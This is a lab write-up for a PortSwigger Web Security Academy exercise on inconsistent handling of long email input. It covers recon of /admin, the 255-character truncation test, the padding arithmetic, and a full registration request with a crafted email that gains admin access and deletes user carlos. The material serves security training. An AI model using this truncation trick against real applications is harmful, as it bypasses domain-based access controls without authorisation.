# Inconsistent Handling of Exceptional Input

## Lab Overview



**Category:** Business Logic Vulnerabilities

**Difficulty:** Practitioner

**Goal:** Access the admin panel and delete the user `carlos`.



---



## 1. Vulnerability Definition



**Inconsistent Handling of Exceptional Input** occurs when different components of an application process the same input differently, 
especially when the input is unusually long or otherwise unexpected.



In this lab, the email address is handled inconsistently:



* The email delivery system processes the **full email address**.

* The application stores only the **first 255 characters**.

* By carefully controlling where the truncation occurs, we can make the stored email appear to belong to `@dontwannacry.com`.



This allows us to bypass the application's intended email-domain restriction and gain access to administrative functionality.



---



## 2. Reconnaissance



First, discover the hidden admin endpoint.



In Burp Suite:



```text

Target → Site map → Right-click lab domain

→ Engagement tools → Discover content

```


The discovered endpoint is:




```http

GET /admin HTTP/2

Host: <LAB-ID>.web-security-academy.net

```




Access is denied because the application expects a `DontWannaCry` user.



---



## 3. Identify the Registration Requirement



Navigate to:



```text

/register

```



The registration page indicates that employees should use a company email address:



```text

@dontwannacry.com

```



However, we do not control that domain.


The lab provides an email client with a unique email-server domain such as:



```text

YOUR-EMAIL-ID.web-security-academy.net

```



The email client can receive messages addressed to this domain and its subdomains.



---



## 4. Test Email Truncation



First, register an account using an unusually long email address:



```text

aaaaaaaa...(200+ characters)...@YOUR-EMAIL-ID.web-security-academy.net



```


A typical registration request looks like:



```http

POST /register HTTP/2

Host: <LAB-ID>.web-security-academy.net

Content-Type: application/x-www-form-urlencoded



csrf=<CSRF-TOKEN>&username=test1&email=<LONG-EMAIL>&password=test

```


After receiving and following the confirmation link, log in and check:


```text

My account

```



The email address is truncated to:



```text

255 characters

```



### Why is this important?



This reveals that the application has a length limitation on the stored email value.




---



## 5. Exploitation Concept



We need an email that satisfies two different requirements.



### Requirement 1 — Email delivery



The full email must end with our controlled email-server domain:



```text

YOUR-EMAIL-ID.web-security-academy.net

```



so that we can receive the confirmation email.



### Requirement 2 — Application-side validation



The first 255 characters must end with:



```text

@dontwannacry.com

```



Therefore, we construct:



```text

<238 characters>@dontwannacry.com.YOUR-EMAIL-ID.web-security-academy.net

```



---



## 6. Payload Calculation



The target stored suffix is:



```text

@dontwannacry.com

```




Its length is:



```text

17 characters

```



The application stores the first:



```text

255 characters

```



Therefore:



```text


255 - 17 = 238

```



So we need approximately:



```text

238 characters

```



before:



```text

@dontwannacry.com


```


The payload concept is:




```text

aaaaaaaa...(238 characters)...@dontwannacry.com.YOUR-EMAIL-ID.web-security-academy.net

```




---



## 7. Final Registration Request




```http

POST /register HTTP/2

Host: <LAB-ID>.web-security-academy.net

Content-Type: application/x-www-form-urlencoded



csrf=<CSRF-TOKEN>&username=test2&email=aaaaaaaa...(238 chars)...%40dontwannacry.com.YOUR-EMAIL-ID.web-security-academy.net&password=test


```




The exact CSRF token, lab ID, and email-server ID will be different for each lab instance.


---




## 8. Why the Payload Works



The full email might look like:




```text

[238 characters]@dontwannacry.com.YOUR-EMAIL-ID.web-security-academy.net


```



The email client sees the complete address and can receive the confirmation email because the final domain is our controlled:




```text

YOUR-EMAIL-ID.web-security-academy.net

```



However, the application truncates the email to 255 characters.



Therefore, the stored value becomes:



```text

[238 characters]@dontwannacry.com

```





Everything after:



```text

@dontwannacry.com


```




is removed.



---



## 9. Complete Attack Flow


```text

1. Discover /admin

        ↓

2. Confirm that only DontWannaCry users can access it

        ↓


3. Inspect the registration functionality

        ↓

4. Test an unusually long email address

        ↓

5. Observe that stored emails are truncated to 255 characters

        ↓

6. Build a long email containing:

   @dontwannacry.com

   followed by our controlled email domain

        ↓

7. Position @dontwannacry.com exactly at character 255

        ↓
8. Receive the confirmation email

        ↓

9. Confirm the registration

        ↓

10. Log in

        ↓

11. Access /admin

        ↓

12. Delete carlos

```



---



## 10. Root Cause



The vulnerability exists because different parts of the application make different assumptions about the same input.



```text

                    Long Email

                       |

              +--------+--------+


              |                 |

              ↓                 ↓

        Email Delivery     Application

              |                 |

       Full email used     Truncated to

                           255 characters

              |                 |

              ↓                 ↓

     Confirmation reaches    Stored email

          our inbox        ends with @dontwannacry.com

```



The security decision is therefore based on a **different representation of the email address** than the one used to deliver the 
confirmation message.



---


## 11. Key Takeaways



### What to test



When testing business logic, look for inconsistencies between:


* Input validation

* Database storage

* Email processing

* Authentication

* Authorization

* Application logic



### Important question



Whenever an application accepts unusually long input, ask:



> Does every component process the input in exactly the same way?



In this lab, the answer is **no**.



### Important technique



A long input can sometimes be crafted so that:



```text

Full input → accepted by one component

Truncated input → interpreted differently by another component

```



---



## 12. Key Payload



```text

[238 characters]@dontwannacry.com.YOUR-EMAIL-ID.web-security-academy.net


```



The critical condition is:


```text

[238 characters] + @dontwannacry.com

= 255 characters

```



---



## 13. Impact



The flaw allows an attacker to bypass the intended email-domain restriction and gain access to administrative functionality.



In this lab, successful exploitation provides access to:


```text

/admin

```



which allows deletion of:



```text

carlos

```



---



## References



* PortSwigger Web Security Academy — Inconsistent handling of exceptional input.


